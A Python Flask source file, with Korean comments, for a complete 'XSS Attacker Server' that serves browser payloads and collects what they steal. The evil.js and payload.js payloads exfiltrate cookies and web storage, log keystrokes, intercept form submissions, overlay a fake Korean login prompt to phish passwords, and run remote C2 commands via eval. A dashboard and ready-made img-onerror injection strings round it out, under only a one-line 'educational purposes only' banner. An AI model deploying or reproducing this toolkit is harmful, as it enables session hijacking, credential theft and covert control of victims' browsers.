from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import datetime
import json
import random

app = Flask(__name__)
CORS(app)  # CORS 활성화 (XSS가 작동하도록)

# 수집된 데이터 저장
stolen_data = {
    'cookies': [],
    'keystrokes': [],
    'passwords': [],
    'sessions': [],
    'browser_info': [],
    'screenshots': []
}

# 명령 큐 (C2 서버용)
command_queue = []

@app.route('/')
def index():
    """메인 페이지"""
    return """
<!DOCTYPE html>
<html>
<head>
    <title>XSS Attacker Server</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
        .stat-box { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border: 2px solid #dee2e6; }
        .stat-box h3 { color: #495057; margin: 0; }
        .stat-box .number { font-size: 2em; color: #007bff; font-weight: bold; }
        .links { text-align: center; margin: 20px 0; }
        .links a { margin: 0 10px; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; display: inline-block; }
        .links a:hover { background: #0056b3; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; color: #856404; padding: 15px; border-radius: 5px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 XSS Attacker Server Dashboard</h1>
        
        <div class="warning">
            <strong>⚠️ Warning:</strong> This server is for educational purposes only. 
            Use only in authorized penetration testing scenarios.
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <h3>🍪 Cookies Stolen</h3>
                <div class="number">""" + str(len(stolen_data['cookies'])) + """</div>
            </div>
            <div class="stat-box">
                <h3>⌨️ Keystrokes Logged</h3>
                <div class="number">""" + str(len(stolen_data['keystrokes'])) + """</div>
            </div>
            <div class="stat-box">
                <h3>🔑 Passwords Captured</h3>
                <div class="number">""" + str(len(stolen_data['passwords'])) + """</div>
            </div>
            <div class="stat-box">
                <h3>📊 Sessions Hijacked</h3>
                <div class="number">""" + str(len(stolen_data['sessions'])) + """</div>
            </div>
        </div>
        
        <div class="links">
            <a href="/view/all">📊 View All Data</a>
            <a href="/view/cookies">🍪 View Cookies</a>
            <a href="/view/keystrokes">⌨️ View Keystrokes</a>
            <a href="/view/passwords">🔑 View Passwords</a>
            <a href="/evil.js">📜 View Evil.js</a>
            <a href="/clear" onclick="return confirm('Clear all data?')">🗑️ Clear Data</a>
        </div>
        
        <h2>📡 XSS Payload Examples:</h2>
        <pre style="background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto;">
&lt;!-- Basic Cookie Theft --&gt;
&lt;img src=x onerror="new Image().src='""" + request.url_root + """steal?c='+document.cookie"&gt;

&lt;!-- Load Full Payload --&gt;
&lt;img src=x onerror="s=document.createElement('script');s.src='""" + request.url_root + """evil.js';document.body.appendChild(s)"&gt;

&lt;!-- Simple Alert --&gt;
&lt;img src=x onerror="alert(1)"&gt;
        </pre>
    </div>
</body>
</html>
    """

@app.route('/steal')
def steal_cookie():
    """쿠키 수집"""
    cookie = request.args.get('c', '')
    if cookie:
        entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'cookie': cookie,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'referer': request.headers.get('Referer', '')
        }
        stolen_data['cookies'].append(entry)
        print(f"[+] Cookie stolen from {request.remote_addr}: {cookie}")
    
    # 1x1 픽셀 이미지 반환 (CORS 우회)
    return '', 204

@app.route('/keylog')
def keylog():
    """키로거 데이터 수집"""
    keys = request.args.get('k', '')
    if keys:
        import base64
        try:
            decoded_keys = base64.b64decode(keys).decode('utf-8')
        except:
            decoded_keys = keys
            
        entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'keys': decoded_keys,
            'ip': request.remote_addr,
            'referer': request.headers.get('Referer', '')
        }
        stolen_data['keystrokes'].append(entry)
        print(f"[+] Keystrokes from {request.remote_addr}: {decoded_keys}")
    
    return '', 204

@app.route('/phish')
def phish():
    """피싱 데이터 수집"""
    password = request.args.get('p', '')
    username = request.args.get('u', '')
    
    if password:
        entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'username': username,
            'password': password,
            'ip': request.remote_addr,
            'referer': request.headers.get('Referer', '')
        }
        stolen_data['passwords'].append(entry)
        print(f"[+] Password stolen from {request.remote_addr}: {username}/{password}")
    
    return '', 204

@app.route('/session', methods=['GET', 'POST'])
def session():
    """세션 정보 수집"""
    if request.method == 'POST':
        data = request.get_json() or {}
    else:
        data = request.args.to_dict()
    
    if data:
        entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'data': data,
            'ip': request.remote_addr,
            'method': request.method
        }
        stolen_data['sessions'].append(entry)
        print(f"[+] Session data from {request.remote_addr}: {list(data.keys())}")
    
    return '', 204

@app.route('/hook')
def browser_hook():
    """브라우저 훅 데이터"""
    info = request.args.get('info', '')
    if info:
        import base64
        try:
            decoded_info = base64.b64decode(info).decode('utf-8')
            browser_data = json.loads(decoded_info)
            browser_data['ip'] = request.remote_addr
            browser_data['timestamp'] = datetime.datetime.now().isoformat()
            stolen_data['browser_info'].append(browser_data)
            print(f"[+] Browser hooked: {browser_data.get('userAgent', 'Unknown')}")
        except Exception as e:
            print(f"[-] Hook data decode error: {e}")
    
    return '', 204

@app.route('/screenshot', methods=['POST'])
def collect_screenshot():
    """페이지 정보 수집"""
    data = request.get_json() or {}
    entry = {
        'timestamp': datetime.datetime.now().isoformat(),
        'type': 'PAGE_INFO',
        'data': data,
        'ip': request.remote_addr
    }
    stolen_data['screenshots'].append(entry)
    print(f"[+] Page info collected from {request.remote_addr}")
    return '', 204

@app.route('/command')
def get_command():
    """C2 명령 전송"""
    # 명령 큐에서 가져오기
    if command_queue:
        cmd = command_queue.pop(0)
        return cmd, 200, {
            'Content-Type': 'text/plain',
            'Access-Control-Allow-Origin': '*'
        }
    
    # 기본 하트비트
    return "console.log('[C2] Heartbeat');", 200, {
        'Content-Type': 'text/plain',
        'Access-Control-Allow-Origin': '*'
    }

@app.route('/command/add', methods=['POST'])
def add_command():
    """명령 추가 (관리자용)"""
    cmd = request.form.get('command', '')
    if cmd:
        command_queue.append(cmd)
        return jsonify({'status': 'success', 'queue_length': len(command_queue)})
    return jsonify({'status': 'error', 'message': 'No command provided'})

@app.route('/view/<data_type>')
def view_data(data_type):
    """수집된 데이터 보기"""
    if data_type == 'all':
        return jsonify(stolen_data)
    elif data_type in stolen_data:
        return jsonify(stolen_data[data_type])
    else:
        return "Invalid data type", 404

@app.route('/evil.js')
def serve_evil_js():
    """evil.js 제공"""
    js_code = f"""
// XSS Complete Payload - All attacks included
(function() {{
    // Configuration
    const ATTACKER_SERVER = '{request.url_root.rstrip('/')}';
    console.log('[*] Evil.js loaded from:', ATTACKER_SERVER);
    
    // 1. Cookie Theft
    console.log('[*] Stealing cookies...');
    const cookies = document.cookie || 'No cookies found';
    new Image().src = ATTACKER_SERVER + '/steal?c=' + encodeURIComponent(cookies);
    
    // 2. Session Data Collection
    console.log('[*] Collecting session data...');
    const sessionData = {{
        cookies: document.cookie,
        localStorage: {{}},
        sessionStorage: {{}},
        url: window.location.href,
        title: document.title,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height
    }};
    
    // Collect localStorage
    try {{
        for (let key in localStorage) {{
            sessionData.localStorage[key] = localStorage.getItem(key);
        }}
    }} catch(e) {{}}
    
    // Collect sessionStorage
    try {{
        for (let key in sessionStorage) {{
            sessionData.sessionStorage[key] = sessionStorage.getItem(key);
        }}
    }} catch(e) {{}}
    
    // Send session data
    fetch(ATTACKER_SERVER + '/session', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(sessionData),
        mode: 'no-cors'
    }}).catch(() => {{}});
    
    // 3. Keylogger Installation
    console.log('[*] Installing keylogger...');
    let keyBuffer = '';
    let keyCount = 0;
    
    document.addEventListener('keypress', function(e) {{
        keyBuffer += e.key;
        keyCount++;
        
        // Send every 10 keystrokes
        if (keyBuffer.length >= 10) {{
            const encoded = btoa(keyBuffer);
            new Image().src = ATTACKER_SERVER + '/keylog?k=' + encoded;
            console.log('[+] Sent', keyCount, 'keystrokes');
            keyBuffer = '';
        }}
    }});
    
    // Also capture special keys
    document.addEventListener('keydown', function(e) {{
        if (e.key === 'Enter' || e.key === 'Tab') {{
            keyBuffer += '[' + e.key + ']';
        }}
    }});
    
    // 4. Automatic File Download
    setTimeout(function() {{
        console.log('[*] Triggering file download...');
        const content = "이 컴퓨터는 이제 제 껍니다. 제 마음대로 할 수 있는 겁니다.\\n\\n" +
                      "시스템 정보:\\n" +
                      "- User Agent: " + navigator.userAgent + "\\n" +
                      "- Language: " + navigator.language + "\\n" +
                      "- Platform: " + navigator.platform + "\\n" +
                      "- Screen: " + screen.width + "x" + screen.height + "\\n" +
                      "- Cookies: " + document.cookie + "\\n\\n" +
                      "이 파일은 XSS 공격의 증거입니다.";
        
        const blob = new Blob([content], {{type: 'text/plain;charset=utf-8'}});
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = '리버스_쉘이라면.txt';
        document.body.appendChild(a);
        a.click();
        
        setTimeout(function() {{
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        }}, 100);
        
        console.log('[+] File download triggered');
    }}, 2000);
    
    // 5. Phishing Form Injection
    setTimeout(function() {{
        console.log('[*] Injecting phishing form...');
        
        const style = document.createElement('style');
        style.textContent = `
            #phishing-overlay {{
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                z-index: 999999;
                display: flex;
                align-items: center;
                justify-content: center;
                animation: fadeIn 0.3s;
            }}
            
            @keyframes fadeIn {{
                from {{ opacity: 0; }}
                to {{ opacity: 1; }}
            }}
            
            #phishing-form {{
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
                max-width: 400px;
                width: 90%;
            }}
            
            #phishing-form h2 {{
                color: #333;
                margin-bottom: 20px;
                font-size: 24px;
            }}
            
            #phishing-form input {{
                width: 100%;
                padding: 10px;
                margin-bottom: 15px;
                border: 1px solid #ddd;
                border-radius: 5px;
                font-size: 16px;
            }}
            
            #phishing-form button {{
                width: 100%;
                padding: 12px;
                background: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
                transition: background 0.3s;
            }}
            
            #phishing-form button:hover {{
                background: #45a049;
            }}
        `;
        document.head.appendChild(style);
        
        const overlay = document.createElement('div');
        overlay.id = 'phishing-overlay';
        overlay.innerHTML = `
            <div id="phishing-form">
                <h2>⚠️ 세션이 만료되었습니다</h2>
                <p style="color: #666; margin-bottom: 20px;">보안을 위해 다시 로그인해주세요.</p>
                <input type="text" id="phish-username" placeholder="사용자명" />
                <input type="password" id="phish-password" placeholder="비밀번호" />
                <button onclick="window.submitPhishing()">로그인</button>
            </div>
        `;
        
        document.body.appendChild(overlay);
        
        // Submit function
        window.submitPhishing = function() {{
            const username = document.getElementById('phish-username').value;
            const password = document.getElementById('phish-password').value;
            
            if (username && password) {{
                const url = ATTACKER_SERVER + '/phish?u=' + encodeURIComponent(username) + 
                           '&p=' + encodeURIComponent(password);
                new Image().src = url;
                
                console.log('[+] Credentials stolen:', username);
                
                // Remove overlay
                document.getElementById('phishing-overlay').remove();
                alert('로그인되었습니다!');
            }}
        }};
    }}, 5000);
    
    // 6. Command & Control (C2) Connection
    console.log('[*] Establishing C2 connection...');
    let c2Connected = false;
    
    setInterval(function() {{
        fetch(ATTACKER_SERVER + '/command')
            .then(response => response.text())
            .then(command => {{
                if (command && command.trim()) {{
                    if (!c2Connected) {{
                        console.log('[+] C2 connection established');
                        c2Connected = true;
                    }}
                    
                    try {{
                        console.log('[C2] Executing:', command);
                        eval(command);
                    }} catch(e) {{
                        console.error('[C2] Command failed:', e);
                    }}
                }}
            }})
            .catch(() => {{
                if (c2Connected) {{
                    console.log('[-] C2 connection lost');
                    c2Connected = false;
                }}
            }});
    }}, 5000);
    
    // 7. Screenshot/Page Info Collection
    setTimeout(function() {{
        console.log('[*] Collecting page information...');
        
        const pageInfo = {{
            title: document.title,
            url: window.location.href,
            forms: [],
            links: [],
            inputs: [],
            images: []
        }};
        
        // Collect forms
        document.querySelectorAll('form').forEach(form => {{
            pageInfo.forms.push({{
                action: form.action,
                method: form.method,
                inputs: Array.from(form.elements).map(e => ({{
                    name: e.name,
                    type: e.type,
                    value: e.value
                }}))
            }});
        }});
        
        // Collect links
        document.querySelectorAll('a').forEach(link => {{
            if (link.href && !link.href.startsWith('javascript:')) {{
                pageInfo.links.push(link.href);
            }}
        }});
        
        // Collect inputs
        document.querySelectorAll('input, textarea, select').forEach(input => {{
            pageInfo.inputs.push({{
                name: input.name,
                type: input.type,
                value: input.value,
                id: input.id
            }});
        }});
        
        // Send page info
        fetch(ATTACKER_SERVER + '/screenshot', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(pageInfo),
            mode: 'no-cors'
        }}).catch(() => {{}});
        
        console.log('[+] Page information collected');
    }}, 3000);
    
    // 8. Additional Features
    
    // Click tracking
    let clickCount = 0;
    document.addEventListener('click', function(e) {{
        clickCount++;
        if (clickCount % 5 === 0) {{ // Every 5 clicks
            console.log('[*] User clicked', clickCount, 'times');
        }}
    }});
    
    // Form submission interception
    document.addEventListener('submit', function(e) {{
        console.log('[*] Form submitted:', e.target.action);
        
        const formData = new FormData(e.target);
        const data = {{}};
        formData.forEach((value, key) => {{
            data[key] = value;
        }});
        
        // Send form data
        fetch(ATTACKER_SERVER + '/session', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                type: 'form_submission',
                action: e.target.action,
                data: data,
                timestamp: new Date().toISOString()
            }}),
            mode: 'no-cors'
        }}).catch(() => {{}});
    }});
    
    // Console message
    console.log('%c[+] XSS Payload Successfully Loaded!', 'color: #00ff00; font-size: 16px; font-weight: bold;');
    console.log('%cAll attack vectors are now active:', 'color: #ffaa00; font-size: 14px;');
    console.log('✓ Cookie theft');
    console.log('✓ Keylogger');
    console.log('✓ Auto file download');
    console.log('✓ Phishing form');
    console.log('✓ C2 connection');
    console.log('✓ Page info collection');
    
    // Send success notification
    new Image().src = ATTACKER_SERVER + '/steal?c=XSS_PAYLOAD_LOADED';
    
}})();
"""
    
    response = make_response(js_code)
    response.headers['Content-Type'] = 'application/javascript'
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    return response

@app.route('/payload.js')
def serve_payload_js():
    """간단한 버전의 페이로드"""
    js_code = f"""
// Simple XSS Payload
(function() {{
    const SERVER = '{request.url_root.rstrip('/')}';
    
    // Cookie theft
    new Image().src = SERVER + '/steal?c=' + encodeURIComponent(document.cookie);
    
    // Simple keylogger
    document.onkeypress = function(e) {{
        new Image().src = SERVER + '/keylog?k=' + e.key;
    }};
    
    // File download
    setTimeout(function() {{
        const a = document.createElement('a');
        a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('이 컴퓨터는 이제 제 껍니다. 제 마음대로 할 수 있는 겁니다.');
        a.download = '리버스_쉘이라면.txt';
        a.click();
    }}, 1000);
    
    console.log('[+] Simple payload executed!');
}})();
"""
    
    response = make_response(js_code)
    response.headers['Content-Type'] = 'application/javascript'
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/clear')
def clear_data():
    """데이터 초기화"""
    global stolen_data
    stolen_data = {
        'cookies': [],
        'keystrokes': [],
        'passwords': [],
        'sessions': [],
        'browser_info': [],
        'screenshots': []
    }
    return '<script>alert("Data cleared!"); window.location="/";</script>'

# POST 요청 처리
@app.route('/svg', methods=['POST'])
@app.route('/xhr', methods=['POST'])
@app.route('/mouse', methods=['GET'])
@app.route('/img', methods=['GET'])
def handle_various():
    """다양한 XSS 벡터 처리"""
    # GET parameters
    cookie = request.args.get('c', '')
    if cookie:
        entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'cookie': cookie,
            'ip': request.remote_addr,
            'endpoint': request.path,
            'method': request.method
        }
        stolen_data['cookies'].append(entry)
        print(f"[+] Data from {request.path}: {cookie}")
    
    # POST data
    if request.method == 'POST':
        data = request.get_data(as_text=True)
        if data:
            entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'data': data,
                'ip': request.remote_addr,
                'endpoint': request.path
            }
            stolen_data['sessions'].append(entry)
            print(f"[+] POST data from {request.path}: {data[:100]}")
    
    return '', 204

if __name__ == '__main__':
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║                  XSS Attacker Server v2.0                  ║
    ╠════════════════════════════════════════════════════════════╣
    ║  [*] Starting server on http://0.0.0.0:5000                ║
    ║  [*] CORS enabled for cross-origin requests                ║
    ║                                                            ║
    ║  Endpoints:                                                ║
    ║  /              - Dashboard                                ║
    ║  /steal?c=      - Cookie theft                             ║
    ║  /keylog?k=     - Keylogger data                           ║
    ║  /phish?u=&p=   - Phishing credentials                     ║
    ║  /session       - Session data (POST)                      ║
    ║  /hook          - Browser hook                             ║
    ║  /command       - C2 commands                              ║
    ║  /evil.js       - Full attack payload                      ║
    ║  /payload.js    - Simple payload                           ║
    ║  /view/all      - View all stolen data                     ║
    ║  /clear         - Clear all data                           ║
    ║                                                            ║
    ║  XSS Payload:                                              ║
    ║  <img src=x onerror="s=document.createElement('script');   ║
    ║  s.src='http://YOUR_IP:5000/evil.js';                      ║
    ║  document.body.appendChild(s)">                            ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    # Run server
    app.run(host='0.0.0.0', port=5000, debug=True)